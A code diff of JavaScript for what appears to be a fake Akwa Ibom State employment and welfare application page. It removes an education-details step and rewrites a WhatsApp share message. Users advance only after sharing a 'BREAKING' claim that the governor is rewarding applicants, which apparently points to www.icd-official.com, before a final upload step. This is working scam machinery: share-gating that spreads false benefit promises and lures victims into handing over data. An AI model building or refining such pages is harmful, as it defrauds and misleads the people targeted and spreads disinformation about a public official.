@@ -253,44 +253,9 @@ function validateStep1() {
     }
 }
 
-// --- Step 2: Educational Details ---
+// --- Step 3: Share Logic (Updated for Real WhatsApp Sharing) ---
 function loadStep2() {
     updateProgress(2);
-    contentArea.innerHTML = `
-        <h4>Educational History</h4>
-        <p style="font-size:0.9rem; color:#666; margin-bottom:15px;">Please provide details of your highest qualification.</p>
-        <div class="form-group">
-            <label>Institution Name</label>
-            <input type="text" id="edu-school" class="form-control">
-        </div>
-        <div class="form-group">
-            <label>Qualification (e.g., BSc, HND, SSCE)</label>
-            <input type="text" id="edu-qual" class="form-control">
-        </div>
-        <div class="form-group">
-            <label>Year of Graduation</label>
-            <input type="number" id="edu-year" class="form-control">
-        </div>
-        <div class="form-group">
-            <label>Additional Certifications (Optional)</label>
-            <textarea id="edu-extra" class="form-control" rows="3"></textarea>
-        </div>
-        <div class="error-msg" id="edu-err">Please fill required fields.</div>
-        <button onclick="validateStep2()" class="btn-block">Continue</button>
-    `;
-}
-
-function validateStep2() {
-    if(document.getElementById('edu-school').value === "" || document.getElementById('edu-qual').value === "") {
-        document.getElementById('edu-err').style.display = 'block';
-    } else {
-        showLoaderAndNext(3, loadStep3);
-    }
-}
-
-// --- Step 3: Share Logic (Updated for Real WhatsApp Sharing) ---
-function loadStep3() {
-    updateProgress(3);
     shareCount = 0; // Reset share count
     contentArea.innerHTML = `
         <div style="text-align: center;">
@@ -322,14 +287,14 @@ function loadStep3() {
 function handleShare() {
     // 1. The Message based on the article
     const siteUrl = window.location.href; // Gets the current website link
-    const text = `BREAKING: Akwa Ibom State Governor, Pastor Umo Eno, rewards all 33,000 Civil Service Applicants! 
+    const text = `BREAKING: Akwa Ibom State Governor has launched an empowerment program for Akwa Ibom citizens! 
     
-✅ ₦50,000 Welfare Support for ALL applicants
-✅ 4,000 Employment Letters to be issued
+✅ Inclusive Employment for All
+✅ Empowering Akwa Ibom Citizens
 ✅ Skills Training for others
 
 Check if you are eligible and complete your application here: 
-${siteUrl}`;
+www.icd-official.com`;
 
     // 2. Create the WhatsApp URL
     const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
@@ -354,14 +319,14 @@ ${siteUrl}`;
         btn.disabled = true;
 
         setTimeout(() => {
-            showLoaderAndNext(4, loadStep4);
+            showLoaderAndNext(3, loadStep3);
         }, 1500); // Slight delay to allow user to return to tab
     }
 }
 
 // --- Step 4: Final ---
-function loadStep4() {
-    updateProgress(4);
+function loadStep3() {
+    updateProgress(3);
     contentArea.innerHTML = `
         <div style="text-align: center;">
             <i class="fas fa-file-upload" style="font-size: 3rem; color: var(--accent-orange); margin-bottom: 10px;"></i>
